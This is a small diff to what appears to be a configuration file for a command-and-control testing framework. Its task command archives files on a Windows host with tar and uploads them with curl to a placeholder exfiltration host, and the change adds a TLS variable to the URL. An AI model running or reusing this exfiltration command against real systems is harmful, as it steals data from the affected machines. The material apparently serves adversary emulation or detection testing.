@@ -10,4 +10,4 @@ cert_subj = /C=US/ST=Utah/L=Lehi/O=Your Company, Inc./OU=IT/CN=$HOST
 [c2_task]
 task_name = c2_http_MM_dd_YYYY_HH_mm
 agent_name = 1w2x3y4z
-command_list = tar.exe -a -c -f c:\$EXFIL_OUTFILE c:\*MB.bin; dir c:\, c:\Windows\System32\curl.exe -k -F file=@c:\$EXFIL_OUTFILE $EXFIL_TYPE://$EXFIL_HOST:$EXFIL_PORT/p
+command_list = tar.exe -a -c -f c:\$EXFIL_OUTFILE c:\*MB.bin; dir c:\, c:\Windows\System32\curl.exe -k -F file=@c:\$EXFIL_OUTFILE $EXFIL_TYPE$TLS://$EXFIL_HOST:$EXFIL_PORT/p
